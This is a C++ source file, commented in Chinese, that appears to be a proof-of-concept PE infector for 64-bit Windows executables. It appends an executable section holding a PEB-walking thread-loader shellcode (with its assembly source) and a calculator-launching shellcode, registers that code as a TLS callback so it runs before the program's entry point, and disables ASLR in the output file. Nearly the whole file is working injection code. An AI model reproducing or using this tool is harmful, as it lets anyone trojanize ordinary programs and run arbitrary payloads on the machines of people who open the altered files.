#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>

// 虚拟的 Shellcode：仅包含几个 NOP 指令和一个 RET 指令。
// 对于真实的负载（Payload），这部分代码应当保存寄存器状态，且不能直接退出进程。
unsigned char dummy_shellcode[] = {
    0x90, 0x90, 0x90, 0x90, // NOP 指令
    0xC3                    // RET 指令
};

// 默认提供一个弹计算器的 x64 Shellcode（可能会被杀毒软件拦截）
// 如果想简单测试是否执行，可以换成死循环 Shellcode: { 0xEB, 0xFE }，程序运行后会卡住不输出内容
unsigned char calc_shellcode[] = {
0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3};

// 线程加载器 Shellcode (x64)
// 功能：查找 Kernel32 -> CreateThread，为负载（Payload）生成一个新线程，然后返回。
// 这样可以防止加载器锁（Loader Lock）死锁并阻塞主线程。
//
// 汇编源码供参考 (loader.s):
//
//    .global _start
//    .section .text
//
//_start:
//    /* 保存寄存器（非易失性，TLS 回调需要） */
//    push %rbx
//    push %rbp
//    push %rdi
//    push %rsi
//    push %r12
//    push %r13
//    push %r14
//    push %r15
//
//    sub $0x28, %rsp           /* 栈对齐 */
//
//    /* 1. 查找 Kernel32 基址 */
//    mov %gs:0x60, %rax        /* PEB */
//    mov 0x18(%rax), %rax      /* PEB_LDR_DATA */
//    mov 0x20(%rax), %rax      /* InMemoryOrderModuleList */
//    mov (%rax), %rax          /* ntdll.dll */
//    mov (%rax), %rax          /* kernel32.dll */
//    mov 0x20(%rax), %rbx      /* DllBase (Kernel32) */
//
//    /* 2. 查找 CreateThread */
//    mov 0x3c(%rbx), %r8d      /* e_lfanew */
//    add %rbx, %r8             /* NT 头 */
//    mov 0x88(%r8), %r8d       /* 数据目录[0] (导出表) */
//    add %rbx, %r8             /* 导出目录 */
//
//    mov 0x20(%r8), %r9d       /* 名称表地址 */
//    add %rbx, %r9             
//
//    mov 0x24(%r8), %r10d      /* 名称序号表地址 */
//    add %rbx, %r10            
//
//    mov 0x1c(%r8), %r11d      /* 函数地址表地址 */
//    add %rbx, %r11            
//
//    xor %rcx, %rcx            /* 计数器 */
//
//find_loop:
//    mov (%r9, %rcx, 4), %edx  /* 名称 RVA */
//    add %rbx, %rdx            /* 名称 VA */
//
//    /* 检查 "CreateTh" (0x6854657461657243) */
//    mov $0x6854657461657243, %rax
//    cmp %rax, (%rdx)
//    jne next_func
//    
//    /* 检查 "read" (0x64616572) */
//    cmpl $0x64616572, 8(%rdx)
//    je found_func
//
//next_func:
//    inc %rcx
//    jmp find_loop
//
//found_func:
//    /* 获取序号 */
//    movzw (%r10, %rcx, 2), %eax 
//    /* 获取函数 RVA */
//    mov (%r11, %rax, 4), %eax   
//    add %rbx, %rax              /* CreateThread 的 VA */
//    mov %rax, %r12              /* 保存地址 */
//
//    /* 3. 调用 CreateThread */
//    xor %rcx, %rcx              /* lpThreadAttributes */
//    xor %rdx, %rdx              /* dwStackSize */
//    
//    /* 计算负载（Payload）地址 */
//    lea 0x64(%rip), %r8       /* 负载的偏移量（近似值，下面已调整） */
//    
//    xor %r9, %r9                /* lpParameter */
//    movq $0, 0x20(%rsp)         /* dwCreationFlags */
//    movq $0, 0x28(%rsp)         /* lpThreadId */
//    
//    call *%r12                  
//
//    /* 4. 恢复寄存器并返回 */
//    add $0x28, %rsp
//    
//    pop %r15
//    pop %r14
//    pop %r13
//    pop %r12
//    pop %rsi
//    pop %rdi
//    pop %rbp
//    pop %rbx
//    
//    ret

unsigned char thread_loader[] = {
    0x53, 0x55, 0x57, 0x56, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x28, 
    0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 
    0x20, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x58, 0x20, 0x44, 0x8b, 0x43, 0x3c, 0x49, 
    0x01, 0xd8, 0x45, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x49, 0x01, 0xd8, 0x45, 0x8b, 0x48, 0x20, 
    0x49, 0x01, 0xd9, 0x45, 0x8b, 0x50, 0x24, 0x49, 0x01, 0xda, 0x45, 0x8b, 0x58, 0x1c, 0x49, 0x01, 
    0xdb, 0x48, 0x31, 0xc9, 0x41, 0x8b, 0x14, 0x89, 0x48, 0x01, 0xda, 0x48, 0xb8, 0x43, 0x72, 0x65, 
    0x61, 0x74, 0x65, 0x54, 0x68, 0x48, 0x39, 0x02, 0x75, 0x09, 0x81, 0x7a, 0x08, 0x72, 0x65, 0x61, 
    0x64, 0x74, 0x05, 0x48, 0xff, 0xc1, 0xeb, 0xdc, 0x41, 0x0f, 0xb7, 0x04, 0x4a, 0x41, 0x8b, 0x04, 
    0x83, 0x48, 0x01, 0xd8, 0x49, 0x89, 0xc4, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4c, 0x8d, 0x05, 
    0x29, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x41, 0xff, 0xd4, 0x48, 0x83, 0xc4, 0x28, 
    0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5e, 0x5f, 0x5d, 0x5b, 0xc3
};

DWORD Align(DWORD size, DWORD align) {
    if (size % align == 0) return size;
    return size + (align - (size % align));
}

bool InjectTLS(const char* targetFile, const char* outputFile) {
    std::ifstream file(targetFile, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cerr << "Cannot open target file.\n";
        return false;
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::cerr << "Failed to read target file.\n";
        return false;
    }
    file.close();

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer.data();
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "Not a valid DOS executable.\n";
        return false;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(buffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "Not a valid PE file.\n";
        return false;
    }

    if (ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Only 64-bit PE files are supported for this PoC.\n";
        return false;
    }

    // 准备新的节区
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER lastSection = &sectionHeader[ntHeaders->FileHeader.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER newSection = lastSection + 1;

    // 检查是否有空间放置新的节区头
    DWORD headersEnd = dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (headersEnd + sizeof(IMAGE_SECTION_HEADER) > ntHeaders->OptionalHeader.SizeOfHeaders) {
        std::cerr << "No space for new section header.\n";
        return false;
    }

    // 定义新节区的属性
    memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER));
    memcpy(newSection->Name, ".tlsinj", 7);
    
    // 虚拟地址和大小
    newSection->VirtualAddress = Align(lastSection->VirtualAddress + lastSection->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
    
    // 原始地址和大小
    newSection->PointerToRawData = Align(lastSection->PointerToRawData + lastSection->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
    
    newSection->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA;

    // 我们将把 Shellcode 以及可能的 TLS 目录和回调数组放在新节区中
    // 新节区的布局：
    // [线程加载器 (Thread Loader)]
    // [Shellcode]
    // [填充到 8 字节对齐]
    // [新回调数组 (如果需要)]
    // [IMAGE_TLS_DIRECTORY64 (如果需要)]

    DWORD sectionSize = 0;
    std::vector<unsigned char> sectionData;

    // 1. 添加 Shellcode
    // 将线程加载器前置到实际的 Shellcode 之前
    for (auto b : thread_loader) sectionData.push_back(b);
    for (auto b : calc_shellcode) sectionData.push_back(b);
    
    // 8 字节对齐以便存放指针
    while (sectionData.size() % 8 != 0) sectionData.push_back(0);

    DWORD shellcodeRVA = newSection->VirtualAddress;
    ULONGLONG shellcodeVA = ntHeaders->OptionalHeader.ImageBase + shellcodeRVA;

    DWORD tlsDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    DWORD tlsDirSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;

    if (tlsDirRVA != 0 && tlsDirSize != 0) {
        std::cout << "[+] 发现现有 TLS 目录。正在修改回调数组。\n";
        
        // 在节区中查找现有的 TLS 目录
        PIMAGE_TLS_DIRECTORY64 pTlsDir = nullptr;
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (tlsDirRVA >= sectionHeader[i].VirtualAddress && tlsDirRVA < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                DWORD offset = tlsDirRVA - sectionHeader[i].VirtualAddress + sectionHeader[i].PointerToRawData;
                pTlsDir = (PIMAGE_TLS_DIRECTORY64)(buffer.data() + offset);
                break;
            }
        }

        if (!pTlsDir) {
            std::cerr << "[-] 无法在文件中定位 TLS 目录。\n";
            return false;
        }

        ULONGLONG callbackArrayVA = pTlsDir->AddressOfCallBacks;
        DWORD callbackArrayRVA = callbackArrayVA - ntHeaders->OptionalHeader.ImageBase;
        
        // 读取现有的回调函数
        std::vector<ULONGLONG> callbacks;
        if (callbackArrayVA != 0) {
            DWORD cbOffset = 0;
            for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                if (callbackArrayRVA >= sectionHeader[i].VirtualAddress && callbackArrayRVA < sectionHeader[i].VirtualAddress + sectionHeader[i].Misc.VirtualSize) {
                    cbOffset = callbackArrayRVA - sectionHeader[i].VirtualAddress + sectionHeader[i].PointerToRawData;
                    break;
                }
            }
            if (cbOffset != 0) {
                ULONGLONG* pCb = (ULONGLONG*)(buffer.data() + cbOffset);
                while (*pCb != 0) {
                    callbacks.push_back(*pCb);
                    pCb++;
                }
            }
        }

        // 添加我们的新回调（指向线程加载器）
        callbacks.push_back(shellcodeVA);
        callbacks.push_back(0); // 空终止符

        // 将新的回调数组放入新节区
        DWORD newCallbackArrayOffset = sectionData.size();
        for (auto cb : callbacks) {
            for (int i = 0; i < 8; i++) {
                sectionData.push_back((cb >> (i * 8)) & 0xFF);
            }
        }

        // 更新 TLS 目录以指向新的回调数组
        ULONGLONG newCallbackArrayVA = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + newCallbackArrayOffset;
        pTlsDir->AddressOfCallBacks = newCallbackArrayVA;

    } else {
        std::cout << "[+] 未找到 TLS 目录。正在创建一个。\n";

        // 创建新的回调数组
        DWORD newCallbackArrayOffset = sectionData.size();
        ULONGLONG callbacks[] = { shellcodeVA, 0 };
        for (auto cb : callbacks) {
            for (int i = 0; i < 8; i++) {
                sectionData.push_back((cb >> (i * 8)) & 0xFF);
            }
        }

        // 创建新的 TLS 目录
        DWORD newTlsDirOffset = sectionData.size();
        IMAGE_TLS_DIRECTORY64 newTlsDir = {0};
        
        // 我们需要为 StartAddressOfRawData 和 EndAddressOfRawData 提供有效地址
        // 我们可以直接指向新节区中的一个空白区域
        DWORD dummyDataOffset = sectionData.size() + sizeof(IMAGE_TLS_DIRECTORY64);
        ULONGLONG dummyDataVA = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + dummyDataOffset;
        
        newTlsDir.StartAddressOfRawData = dummyDataVA;
        newTlsDir.EndAddressOfRawData = dummyDataVA + 8;
        newTlsDir.AddressOfIndex = dummyDataVA + 16;
        newTlsDir.AddressOfCallBacks = ntHeaders->OptionalHeader.ImageBase + newSection->VirtualAddress + newCallbackArrayOffset;
        newTlsDir.SizeOfZeroFill = 0;
        newTlsDir.Characteristics = 0;

        unsigned char* pTls = (unsigned char*)&newTlsDir;
        for (int i = 0; i < sizeof(IMAGE_TLS_DIRECTORY64); i++) {
            sectionData.push_back(pTls[i]);
        }
        
        // 为索引和原始数据添加虚拟数据
        for (int i = 0; i < 24; i++) sectionData.push_back(0);

        // 更新数据目录表
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = newSection->VirtualAddress + newTlsDirOffset;
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeof(IMAGE_TLS_DIRECTORY64);
    }

    newSection->Misc.VirtualSize = sectionData.size();
    newSection->SizeOfRawData = Align(sectionData.size(), ntHeaders->OptionalHeader.FileAlignment);

    // 更新头信息
    ntHeaders->FileHeader.NumberOfSections++;
    ntHeaders->OptionalHeader.SizeOfImage = Align(newSection->VirtualAddress + newSection->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
    
    // 禁用 ASLR 以避免注入的绝对地址出现重定位问题
    ntHeaders->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

    // 写入输出文件
    std::ofstream out(outputFile, std::ios::binary);
    if (!out) {
        std::cerr << "Cannot create output file.\n";
        return false;
    }

    // 写入原始数据直到新节区的开始位置
    buffer.resize(newSection->PointerToRawData, 0); // 如果需要，进行填充
    out.write((char*)buffer.data(), buffer.size());

    // 写入新节区数据
    std::vector<unsigned char> alignedSectionData = sectionData;
    alignedSectionData.resize(newSection->SizeOfRawData, 0);
    out.write((char*)alignedSectionData.data(), alignedSectionData.size());

    std::cout << "[+] 注入成功，输出文件：" << outputFile << "\n";
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <target_file> <output_file>\n";
        return 1;
    }
    InjectTLS(argv[1], argv[2]);
    return 0;
}
